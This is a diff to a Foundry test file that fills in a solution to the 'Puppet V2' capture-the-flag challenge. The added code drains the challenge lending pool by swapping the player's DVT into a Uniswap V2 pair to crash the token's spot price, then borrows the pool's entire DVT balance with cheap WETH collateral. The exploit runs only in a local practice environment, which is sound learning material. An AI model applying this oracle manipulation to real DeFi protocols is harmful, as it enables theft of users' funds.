@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
 import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
 import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
@@ -98,7 +99,38 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        (address tokenA, address tokenB) = UniswapV2Library.sortTokens(address(token), address(weth));
+        // sort:
+        //  - tokenA: WETH
+        //  - tokenB: DVT Token
+        (uint256 reserveA, uint256 reserveB) = UniswapV2Library.getReserves(address(uniswapV2Factory), tokenA, tokenB);
+        uint256 amountWETHOut = UniswapV2Library.getAmountOut(PLAYER_INITIAL_TOKEN_BALANCE, reserveB, reserveA);
+        console.log("expected amount of weth out: ", amountWETHOut);
+
+        // use router to swap dvt for weth and plummet dvt price
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        IUniswapV2Router02(uniswapV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE, amountWETHOut, path, address(player), block.timestamp
+        );
+
+        // get eth required to borrow total dvt in the pool
+        uint256 ethReq = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("DepositOfWETHRequired is: %s", ethReq);
+        console.log("Player's eth balance is : %s", player.balance);
+        console.log("Player's weth balance is : %s", weth.balanceOf(player));
+        require((player.balance + weth.balanceOf(player)) > ethReq, "not enough balance");
+
+        // buy lefting weth with player's balance
+        weth.deposit{value: (ethReq - weth.balanceOf(player))}();
+
+        // borrow dvt
+        weth.approve(address(lendingPool), ethReq);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
